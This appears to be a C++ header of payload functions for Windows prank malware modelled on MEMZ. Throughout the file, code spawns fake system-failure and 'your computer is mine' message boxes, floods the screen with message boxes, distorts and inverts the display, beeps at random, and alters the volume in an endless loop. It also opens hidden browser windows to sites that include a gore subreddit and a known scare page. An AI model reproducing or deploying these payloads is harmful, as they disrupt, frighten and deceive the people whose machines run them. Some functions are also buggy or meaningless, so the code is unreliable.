#pragma once
#include <mmeapi.h>
#include <wingdi.h>
#define fori(x) for (INT i = 0; i < x; i++)
#define whiletrue while (true)

int rickroll() {
    ShellExecuteA(NULL, "open", "https://www.youtube.com/watch?v=dQw4w9WgXcQ", NULL, NULL, SW_HIDE);

    // youtube.com/dQw4w9WgXcQ
    return 0;
}

int p1()
{ //msgbox
    MSGBOXPARAMS msg2 = {0};
    msg2.cbSize = sizeof(MSGBOXPARAMS);
    msg2.hwndOwner = NULL;
    msg2.hInstance = GetModuleHandle(NULL);
    msg2.lpszText = "Your computer is now dead! MUAHAHHAHAHHAAHHAHAHAHHAHHA.";
    msg2.lpszCaption = "Your computer is mine now";
    msg2.dwStyle = MB_OK | MB_ICONHAND;
    HANDLE hmsg2 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg2, NULL, NULL);

    MSGBOXPARAMS msg1 = {0};
    msg1.cbSize = sizeof(MSGBOXPARAMS);
    msg1.hwndOwner = NULL;
    msg1.hInstance = GetModuleHandle(NULL);
    msg1.lpszText = "Error in application \"svchost.exe\": terminating...";
    msg1.lpszCaption = "Error";
    msg1.dwStyle = MB_YESNO | MB_ICONQUESTION;
    HANDLE hmsg3 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg1, NULL, NULL);

    return 0;
}

int p2()
{ //memz final payload but random
    fori(50)
    {
        //msgbox spam
        DWORD dwID = 0;
        MSGBOXPARAMS msg = { 0 };
        msg.cbSize = sizeof(MSGBOXPARAMS);
        msg.hwndOwner = NULL;
        msg.hInstance = GetModuleHandle(NULL);
        msg.lpszText = "bet you regret that now huh";
        msg.lpszCaption = "ez";
        msg.dwStyle = MB_YESNO | MB_ICONQUESTION;
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, 0, &dwID);

        HWND desktop = GetDesktopWindow();
        HDC desk = GetDC(NULL);
        RECT rect;
        GetWindowRect(desktop, &rect);
        int w = rect.right - rect.left;
        int h = rect.bottom - rect.top;
        StretchBlt(desk, rand() % 100, rand() % 100, w - rand() % 100, h - rand() % 100, desk, 0, 0, w, h, MERGECOPY);
        Sleep(300 - (4 * i));
        TextOutA(desk, 100, 100, "Hey look its ur screen down below", 33);
        StretchBlt(desk, 100, 200, 300, 500, desk, 0, 0, w, h, SRCPAINT);

        HRGN hRegion1;
        hRegion1 = CreateRectRgn(0, 0, w, h);
        InvertRgn(desk, hRegion1);

        Beep(rand() % 30000, rand() % 1000);
    }
    return 0;
}

int p3()
{
    HWND desktop = GetDesktopWindow();
    RECT rect;
    GetWindowRect(desktop, &rect);
    INT w = rect.right - rect.left;
    INT h = rect.bottom - rect.top;
    HDC desk = GetDC(NULL);
    PatBlt(desk, rand() % 100, rand() % 100, w, h, DSTINVERT);

    INT sw = GetSystemMetrics(SM_CXSCREEN);
    INT sh = GetSystemMetrics(SM_CYSCREEN);
    SelectObject(desk, CreateSolidBrush(RGB(rand() % 123, rand() % 431, rand() % 311)));

    for (INT index = 0; index < 100; index++)
    {
        BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, 0x9273ecef);
        BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, PATINVERT);
    }

    return 0;
}

// Open a website
int p4() 
{
    MessageBoxW(NULL, L"sub 2 kevlu8", L"do it or i kill ur pc", MB_OK | MB_ICONINFORMATION);
    fori(20)
    {
        LPCSTR urls[] = {
            "https://kevlu8.herokuapp.com",
            "https://www.reddit.com/r/eyeblech",
            "https://www.youtube.com/kevlu8",
            "https://www.github.com/kevlu8",
            "https://www.github.com/kevlu8/Xytharis",
            "https://www.torproject.org/download/",
            "https://www.discord.gg/nhzXNNS",
            "https://www.twitter.com/kevlu8wastaken",
            "https://www.instagram.com",
            "https://www.facebook.com/",
            "https://web.archive.org/web/20210620035058/reddit.com/r/nonewnormal/",
            "https://www.roblox.com",
            "https://www.youareanidiot.org",
            "https://www.twitter.com/dreamwastaken",
            "https://www.youtube.com/channel/UCsiysQAqUGTLsk04k_BVowQ",
            "https://www.youtube.com/watch?v=47ibFGy-w18"
        };
        Sleep(rand() % 10000);
        ShellExecuteA(NULL, "open", urls[rand() % 14], NULL, NULL, SW_HIDE);
    }
    return 0;
}

// Put "Your Mom" on the screen as text
int p5() 
{
    fori(500)
    {
        Sleep(rand() % 100);
        HDC hdc = GetDC(NULL);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        switch (i % 5) {
            case 0:
                TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "Your Mom", 9);
                break;
            case 1:
                TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "ur mom", 7);
                break;
            case 2:
                TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "bjormom", 8);
                break;  
            case 3:
                TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "so bad", 6);
                break;
            default:
                TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "ha", 3);
                break;
        }
        ReleaseDC(NULL, hdc);
    }
    return 0;
}

// Put a random image on the screen
int p6() 
{
    fori(50)
    {
        Sleep(rand() % 100);
        HDC hdc = GetDC(NULL);
        HBITMAP hBitmap = LoadBitmapA(NULL, MAKEINTRESOURCEA(rand() % 1000));
        if (hBitmap == NULL)
        {
            break;
        }
        BITMAP bm;
        GetObject(hBitmap, sizeof(BITMAP), &bm);
        HDC hdcMem = CreateCompatibleDC(hdc);
        SelectObject(hdcMem, hBitmap);
        BitBlt(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);
        DeleteDC(hdcMem);
        DeleteObject(hBitmap);
        ReleaseDC(NULL, hdc);
    }
    return 0;
}


// Randomly change the sound volume
int p7()  //MUST DO IN THREAD
{
    whiletrue
    {
        Sleep(rand() % 10000);
        DWORD dwVolume;
        waveOutGetVolume(NULL, &dwVolume);
        dwVolume = (rand() % 0xFFFF) | (dwVolume & 0xFFFF0000);
        waveOutSetVolume(NULL, dwVolume);
    }
    return 0;
}

// Color shift the screen using BitBlt
int p8() 
{
    fori(50)
    {
        Sleep(rand() % 10000);
        HDC hdc = GetDC(NULL);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN));
        HDC hdcMem = CreateCompatibleDC(hdc);
        SelectObject(hdcMem, hBitmap);
        BitBlt(hdcMem, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), hdc, 0, 0, SRCCOPY);
        fori(GetSystemMetrics(SM_CXSCREEN))
        {
            for (int j = 0; j < SM_CYSCREEN; j++)
            {
                COLORREF color = GetPixel(hdcMem, i, j);
                SetPixel(hdcMem, i, j, RGB(GetRValue(color) + rand() % 0xFF, GetGValue(color) + rand() % 0xFF, GetBValue(color) + rand() % 0xFF));
            }
        }
        BitBlt(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), hdcMem, 0, 0, SRCCOPY);
        DeleteDC(hdcMem);
        DeleteObject(hBitmap);
        ReleaseDC(NULL, hdc);
    }
    return 0;
}

// Connect a virtual USB device
int p9() 
{
    Sleep(rand() % 10000);
    HANDLE hDevice = CreateFileA("\\\\.\\RandomUSBFile", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        return -1;
    }
    CloseHandle(hDevice);
    return 0;
}

int p10() {
    Sleep(rand() % 10000);
    HDC desk = GetDC(NULL);
    while (true) {
        for (int i = 0; i < 500; i++) {
            //0x32526961 is pogChamp
            //42069420 (NO 0x I MAKE MY OWN RULES) is pog
            //0x69696969
            //0x3167000 is insnae
            //0x8107520 is wOw
            BitBlt(desk, i, i, 1500, 1000, desk, 0, 0, 0x3167000);
            // BitBlt(desk, 0, 0, 1920, 1080, desk, 0, 0, 0x69696969);
        }
        /*for (int i = 0; i < 6942; i++) {
            BitBlt(desk, 0, 0, 1920, 1080, desk, -i, 0, SRCCOPY);
        } */
        Sleep(1000);
    }
}
